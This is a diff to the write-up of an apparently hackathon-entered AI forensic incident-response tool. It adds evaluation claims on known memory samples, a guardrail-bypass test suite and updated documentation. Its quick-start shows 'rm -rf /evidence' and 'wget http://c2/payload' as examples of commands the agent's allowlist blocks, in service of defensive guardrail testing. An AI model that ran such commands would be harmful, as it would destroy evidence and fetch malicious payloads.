@@ -57,6 +57,12 @@ On a real run against our benchmark incident it produced **6 findings, applied 7
 self-corrections, and caught 4 hallucinations** — and the report shows the Verifier
 *downgrading an over-claimed C2 attribution* to only what the evidence actually supports.
 
+And we don't ask you to take our word for it. Evaluated against the **canonical
+`zeus.vmem` and `cridex.vmem` memory samples** — the ones every DFIR analyst knows, with
+publicly documented and cited ground truth — the deterministic detection layer scores
+**100% precision / 86% recall / 0 false positives**, reproducible with no API key:
+`python -m benchmarks.evaluate`.
+
 ### How we built it
 - **Architecture = Pattern 2 + 3:** a custom **MCP server** (Pattern 2) exposes the forensic
   tools; a **LangGraph multi-agent orchestrator** (Pattern 3) drives them with a
@@ -88,14 +94,16 @@ self-corrections, and caught 4 hallucinations** — and the report shows the Ver
   honesty the system is built to enforce.
 
 ### Accomplishments that we're proud of
+- **Measured accuracy on the samples every DFIR analyst knows.** On the canonical
+  `zeus.vmem` and `cridex.vmem` images (published, cited ground truth): **100% precision,
+  86% recall, 0 false positives** — reproducible with no API key. Evaluating on the real XP
+  images even surfaced and fixed a process-lineage bug (it had assumed the post-Vista tree).
 - **The self-correction visibly works on real evidence** — it caught itself over-attributing
   a Metasploit C2 finding and corrected it down to the confirmed facts.
-- **93% measured hallucination-catch rate, 0% false positives** — reproducible by anyone in
-  one command, no key required.
-- **218 tests**, all exercising the shipped code, plus architectural security you can demo in
-  three commands.
-- **A judge can run a full sample incident with no SIFT Workstation and no API key** — a
-  deterministic detector + a committed real sample report.
+- **93% hallucination-catch / 0% false positives**, and **20 guardrail-bypass attempts all
+  refused** — both reproducible in one command, no key required.
+- **244 tests**, all exercising the shipped code; a judge can run a full sample incident
+  *and the entire accuracy evaluation* with **no SIFT Workstation and no API key**.
 
 ### What we learned
 - For autonomous IR, **honesty beats confidence.** A system that says "I'm not sure, and
@@ -135,14 +143,18 @@ git clone https://github.com/svaka2000/SIFT-HUNTER && cd SIFT-HUNTER && pip inst
 sift-hunter check "rm -rf /evidence"        # BLOCKED (destructive)
 sift-hunter check "wget http://c2/payload"  # BLOCKED (network egress)
 sift-hunter check "vol3 -f mem.dmp pslist"  # ALLOWED (read-only forensic tool)
+pytest tests/test_security_bypass.py -v     # 20 bypass attempts, all refused
 
-# 2) Reproduce the 93% hallucination-catch / 0% false-positive rate — no key needed
+# 2) MEASURED accuracy on the canonical zeus.vmem + cridex.vmem samples — no key needed
+python -m benchmarks.evaluate               # 100% precision / 86% recall / 0 FP
+
+# 3) Reproduce the 93% hallucination-catch / 0% false-positive rate — no key needed
 python -m benchmarks.hallucination_benchmark
 
-# 3) Full sample incident through the detection engine — no key, no SIFT binaries
+# 4) Full sample incident through the detection engine — no key, no SIFT binaries
 python -m benchmarks.detect_case benchmarks/cases/case001
 
-# 4) Full autonomous agent run (needs GROQ_API_KEY or ANTHROPIC_API_KEY)
+# 5) Full autonomous agent run (needs GROQ_API_KEY or ANTHROPIC_API_KEY)
 sift-hunter analyze benchmarks/cases/case001/evidence/*.csv
 #    …or just read a real run: benchmarks/cases/case001/sample_report.md
 ```
@@ -151,11 +163,11 @@ sift-hunter analyze benchmarks/cases/case001/evidence/*.csv
 | Criterion | How SIFT-HUNTER addresses it |
 |-----------|------------------------------|
 | Autonomous execution | 6-agent LangGraph pipeline runs end-to-end from one command; the Verifier self-corrects with zero human input |
-| IR accuracy | Confidence labels (CONFIRMED = 2+ sources); a ground-truth sample incident + a real committed report |
+| IR accuracy | **Measured 100% precision / 86% recall / 0 FP on the canonical zeus.vmem + cridex.vmem samples** (docs/EVALUATION.md, reproducible no-key); confidence labels separate CONFIRMED from inferred |
 | **Hallucination management** | Deterministic IOC detector + LLM verifier + correction loop — **measured 93% catch / 0% FP, reproducible** |
-| Architectural guardrails | ALLOWED/BLOCKED allowlist + path validation + `shell=False`, enforced in Python, never by prompt |
+| Architectural guardrails | ALLOWED/BLOCKED allowlist + path validation + `shell=False`, enforced in Python, never by prompt — **tested for bypass (20 attempts refused)** |
 | Audit trail | JSONL record of every tool call, finding, correction, transition — `sift-hunter audit <id>` traces any claim to raw evidence |
-| Documentation | One-command install, ARCHITECTURE / SECURITY / ACCURACY / ADDING_TOOLS docs, 218 tests, new tool in < 1 hour |
+| Documentation | One-command install, ARCHITECTURE / SECURITY / EVALUATION / ADDING_TOOLS docs, 244 tests, new tool in < 1 hour |
 
 ---
 
